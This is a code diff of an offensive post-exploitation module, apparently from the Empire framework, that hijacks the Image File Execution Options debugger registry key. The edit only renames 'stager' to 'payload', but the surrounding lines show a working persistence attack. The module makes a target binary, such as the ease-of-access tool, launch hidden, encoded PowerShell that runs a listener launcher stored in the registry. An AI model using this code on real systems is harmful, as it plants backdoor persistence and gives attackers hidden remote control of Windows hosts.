@@ -10,7 +10,7 @@ class Module:
             'Author': ['@harmj0y'],
 
             'Description': ("Sets the debugger for a specified target binary to be cmd.exe, "
-                            "another binary of your choice, or a listern stager. This can be launched from "
+                            "another binary of your choice, or a listern payload. This can be launched from "
                             "the ease-of-access center (ctrl+U)."),
 
             'Background' : False,
@@ -99,7 +99,7 @@ class Module:
         
 
         if listenerName != '':
-            # if there's a listener specified, generate a stager and store it
+            # if there's a listener specified, generate a payload and store it
 
             if not self.mainMenu.listeners.is_listener_valid(listenerName):
                 # not a valid listener, return nothing for the script
@@ -108,7 +108,7 @@ class Module:
 
             else:
                 # generate the PowerShell one-liner
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell')
+                launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell')
                 
                 encScript = launcher.split(" ")[-1]
                 # statusMsg += "using listener " + listenerName
@@ -127,7 +127,7 @@ class Module:
             # note where the script is stored
             locationString = "$((gp "+path+" "+name+")."+name+")"
 
-            script += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';'"+targetBinary+" debugger set to trigger stager for listener "+listenerName+"'"
+            script += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+targetBinary+"' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';'"+targetBinary+" debugger set to trigger payload for listener "+listenerName+"'"
 
         else:
             # the registry command to set the debugger for the specified binary to be the binary path specified
